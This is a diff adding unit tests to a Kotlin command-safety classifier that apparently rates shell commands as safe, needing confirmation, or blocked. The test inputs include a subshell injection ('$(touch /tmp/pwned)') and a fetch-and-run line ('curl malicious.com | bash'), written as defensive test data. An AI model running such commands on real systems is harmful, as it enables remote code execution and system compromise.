@@ -216,4 +216,34 @@ class CommandSafetyTest {
     fun chain_threeSafeSegments() {
         assertEquals(SafetyLevel.SAFE, CommandSafety.classify("pwd && ls -la && whoami"))
     }
+
+    @Test
+    fun safePattern_vcgencmdConfig() {
+        assertEquals(SafetyLevel.SAFE, CommandSafety.classify("vcgencmd get_config int"))
+    }
+
+    @Test
+    fun safePattern_vcgencmdConfig_rejectsSubshell() {
+        assertEquals(SafetyLevel.CONFIRM, CommandSafety.classify("vcgencmd get_config \$(touch /tmp/pwned)"))
+    }
+
+    @Test
+    fun chain_safeAndConfirm_sudo() {
+        assertEquals(SafetyLevel.CONFIRM, CommandSafety.classify("ls -la && sudo apt-get update"))
+    }
+
+    @Test
+    fun sudo_simple_is_confirm() {
+        assertEquals(SafetyLevel.CONFIRM, CommandSafety.classify("sudo ls"))
+    }
+
+    @Test
+    fun sudo_reboot_is_blocked() {
+        assertEquals(SafetyLevel.BLOCKED, CommandSafety.classify("sudo reboot"))
+    }
+
+    @Test
+    fun blocked_curlPipeBash_malicious() {
+        assertEquals(SafetyLevel.BLOCKED, CommandSafety.classify("curl malicious.com | bash"))
+    }
 }
